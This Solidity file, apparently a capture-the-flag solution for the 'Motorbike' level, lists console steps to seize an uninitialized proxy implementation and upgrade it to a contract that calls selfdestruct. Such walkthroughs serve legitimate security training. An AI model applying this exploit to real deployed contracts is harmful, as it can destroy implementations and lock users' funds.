/*Tools needed for this level:
- Console
- Remix 

1.- Get the implementation contract address stored at specific storage slot:
implAddr = await web3.eth.getStorageAt(instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')

2.- Format the implementation contract's address:
implAddr = '0x' + implAddr.slice(-40)

3.- Encode initialize() function:
initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")

4.- Send tx with the encoded data:
await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })

5.- Deploy this contract (MotorbikeAttack) with Remix using the injected Web3 environment.

6.- Declare deployed contract's address in console:
bomb= "replace_with_deployed_contract_address"

7.- Encode explode() function:
explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

8.-  Encode the _upgradeToAndCall () function signature;
upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

9.- Declare the parameters for the function:
upgradeParams = [bomb, explodeData]

10.- Declare the data:
upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)

11.-  Call the function:
await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})

0x85DEB7EA5391094D2148261c8186Aaf10Bb68808

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotorbikeAttack {
	function explode() public {
		selfdestruct(payable(address(0)));
	}
}
